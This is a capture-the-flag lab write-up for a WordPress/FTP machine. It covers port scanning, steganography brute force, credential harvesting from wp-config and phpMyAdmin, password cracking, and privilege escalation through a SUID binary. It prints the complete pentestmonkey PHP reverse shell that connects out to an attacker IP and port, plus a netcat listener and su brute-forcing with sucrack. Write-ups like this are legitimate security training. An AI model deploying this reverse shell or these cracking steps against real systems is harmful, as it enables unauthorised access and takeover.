# Room: Different-CTF

Difficulty: Hard

I began scanning the ports using:
``` bash
nmap -sC -sV TARGET_IP -T4
```
- -sC = default scripts
- -sV = service detection
- -T4 = fast/aggressive

I found 2 open ports:
``` bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Hello World – Just another WordPress site
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.6
Service Info: OS: Unix
```
### Question 1: How many ports are open?

Answer: 2

I tried accessing FTP as the user anonymous, but I got access denied.

Upon visiting the website, I found that it was a WordPress site. I also encountered an error when clicking the login page because it redirected to adana.thm, so I added it to my /etc/hosts to access it.

I also found a username based on a post:
``` html
Posted by hakanbey01
```
I fuzzed for hidden directories:
``` bash
ffuf -u http://adana.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Results:
``` bash
announcements 
index.php 
javascript
phpmyadmin          
server-status         
wp-admin               
wp-content            
wp-includes            
xmlrpc.php
```
### Question 2: What is the name of the secret directory?

Answer: /announcements/

Inside, I found:

- Austrailian-bulldog-ant.jpg
- Wordlist.txt

This was interesting. I checked the photo using exiftool but found nothing, so I used steghide to reveal hidden information, but it required a passphrase. I assumed the wordlist was meant for the photo, so I brute-forced it using stegseek:
``` bash
stegseek austrailian-bulldog-ant.jpg /home/heaven/tryhackme/diff_ctf/wordlist.txt
```
Result:
``` bash
[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".
```
Reading the file returned a Base64 string, so I decoded it:
``` bash
echo "RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=" | base64 -d
```
Result:
``` bash
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```
I transferred wp-config.php to my machine to find credentials.

Credentials found:
``` bash
DB_NAME: phpmyadmin1
DB_USER: phpmyadmin
DB_PASSWORD: 12345
```
Since there was a phpmyadmin directory, I logged in using:
``` bash
User: phpmyadmin
Pass: 12345
```
I check phpmyadmin1, and in wp_user I found:
``` bash
hakanbey01:$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh.
```
I cracked the password using hashcat -m 400
Result:
``` bash
12345
```
I tried to log in to wordpress but i can't.

After being stuck for an hour, I checked wp_options > siteurl and found:
``` bash
http://subdomain.adana.thm
```
I added subdomain.adana.thm to my /etc/hosts and tried the same credentials—and it worked.

Upon investigating, I found that I did not have permission to update files, so I used FTP to upload my reverse shell to the root directory.

Shell.php
``` php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'YOUR_IP';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
After uploading shell.php, I changed its permission:
``` bash
chmod 777 shell.php
```
Then navigated to:
``` 
subdomain.adana.thm/shell.php
```
But don’t forget to start your Netcat listener:
``` bash
nc -lvnp 4444
```
Now I am www-data.

I grabbed the web flag from:
``` bash
/var/www/html/wwe3bbfla4g.txt
```
I ran linpeas but there was nothing valuable.I transfered sucrack to target machine and I tried cracking hakanbey password.

sucrack is a tool used to brute-force Linux user passwords via the su command. It tries multiple passwords from a wordlist to switch users without needing SSH access.

Since the passphrase password earlier was 123adanaantinwar and 123adanacrack for FTP, I modified my wordlist by adding a likely password pattern (123adana) at the beginning to improve the chances of success.

Then I ran:
``` bash
sucrack -u hakanbey -w wordlist.txt
```
After running the attack, I successfully found the correct password:
``` bash
123adanasubaru
```
This allowed me to switch to the hakanbey user and continue the privilege escalation process.

I ran 
``` bash
find / -perm -4000 -type f 2>/dev/null
```
to find suid binaries.

Result:
``` bash
/usr/bin/binary
```
``` bash
-r-srwx--- 1 root hakanbey 12984 Jan 14  2021 /usr/bin/binary
```
I transfered it to my machine and ran ltrace:

My machine
``` bash
ltrace ./binary
strcat("war", "zone")                                                             = "warzone"
strcat("warzone", "in")                                                           = "warzonein"
strcat("warzonein", "ada")                                                        = "warzoneinada"
strcat("warzoneinada", "na")                                                      = "warzoneinadana"
printf("I think you should enter the cor"...)                                     = 52
__isoc99_scanf(0x558ce5a00edd, 0x7ffeca25c000, 0, 0I think you should enter the correct string here ==>a
)                              = 1
strcmp("a", "warzoneinadana") 
```

Correct string: warzoneinadana

Target machine:
```
I think you should enter the correct string here ==>warzoneinadana
warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
```
I transfered root.jpg to my machine and use hexeditor to locate 00000020:

fee9 9d3d 7918 5ffc 826d df1c 69ac c275

I used cyberchef to decode it:

- From Hex
- To Base85

Result:
```
root: Go0odJo0BbBro0o
```
I grabbed the flag at:
``` bash
/root/root.txt
```
